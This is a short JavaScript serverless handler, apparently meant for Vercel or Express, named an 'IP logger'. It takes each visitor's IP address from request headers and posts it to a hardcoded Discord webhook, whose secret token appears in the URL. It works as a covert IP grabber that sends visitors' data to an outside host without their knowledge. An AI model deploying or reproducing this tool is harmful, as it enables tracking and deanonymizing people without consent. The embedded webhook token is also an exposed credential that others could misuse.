// For Express / Node OR as an API route (e.g., /api/ip-logger.js on Vercel)
export default async function handler(req, res) {
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    "Unknown";

  const webhookUrl =
    "https://discord.com/api/webhooks/1370061973395472545/bytne_VJuMBcSD1iKlQ5t9eBvOSA9pp2H4XOxAMIypi-2RIts4sALF6ivwKu8eThfApg";

  await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `🔍 Logged IP: \`${ip}\`` }),
  });

  res.status(200).send("IP logged");
}
